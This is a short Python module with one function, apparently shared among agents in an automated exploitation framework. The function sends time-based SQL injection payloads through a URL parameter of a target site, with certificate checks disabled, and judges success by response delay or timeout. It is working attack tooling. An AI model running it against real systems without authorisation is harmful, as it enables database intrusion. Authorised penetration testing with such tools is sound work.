
import time
import requests
import urllib.parse

# This function is moved from ExploitAgent to be shared between agents.


def execute_real_payload(logger, base_url, param_to_fuzz, payload_str, headers, cookies, threshold=8):
    """Executes a real time-based SQLi payload and measures the response time."""
    logger.info(
        f"Executing real payload against {base_url} on parameter {param_to_fuzz}: {payload_str[:100]}...")

    # URL-encode the payload to ensure it's safely transmitted
    encoded_payload = urllib.parse.quote(payload_str)

    # Dynamically construct the URL
    # This assumes a simple GET request. A more advanced version could handle POST, JSON, etc.
    if "?" in base_url:
        url = f"{base_url}&{param_to_fuzz}={encoded_payload}"
    else:
        url = f"{base_url}?{param_to_fuzz}={encoded_payload}"

    logger.info(f"Constructed test URL: {url}")

    try:
        start_time = time.time()
        # Use a session object for potentially better performance and cookie handling
        with requests.Session() as s:
            s.headers.update(headers)
            s.cookies.update(cookies)
            s.get(url, timeout=threshold + 5, verify=False)
        end_time = time.time()

        response_time = end_time - start_time
        if response_time >= threshold:
            logger.success(
                f"SUCCESS: Request took {response_time:.2f}s (>= threshold {threshold}s), indicating successful time-based injection.")
            return True
        else:
            logger.info(
                f"Request took {response_time:.2f}s (< threshold {threshold}s), no time-based injection detected.")
            return False
    except requests.exceptions.Timeout:
        logger.success(
            "SUCCESS: Request timed out, strongly indicating successful time-based injection.")
        return True
    except requests.exceptions.RequestException as e:
        logger.error(f"An error occurred during the request: {e}")
        return False
